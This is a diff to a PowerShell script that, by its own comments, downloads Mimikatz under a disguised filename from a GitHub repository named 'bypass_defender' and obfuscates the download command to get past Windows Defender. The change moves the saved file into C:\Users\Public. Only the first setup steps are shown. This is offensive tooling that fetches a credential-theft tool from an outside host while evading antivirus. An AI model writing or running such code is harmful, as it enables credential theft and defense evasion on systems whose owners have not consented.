@@ -1,6 +1,6 @@
 # Step 1: Define obfuscated string for downloading Mimikatz from your GitHub repository and renaming it immediately after download
 $downloadYilmaz = "https://raw.githubusercontent.com/onurcangnc/bypass_defender/main/sifreliokuma64.exe"
-$renamedYilmaz = "sifreliokuma64.exe"  # New name after download
+$renamedYilmaz = "C:\Users\Public\sifreliokuma64.exe"  # New name after download
 $downloadPath = "./$renamedYilmaz"
 
 # Step 2: Obfuscate the Invoke-WebRequest command
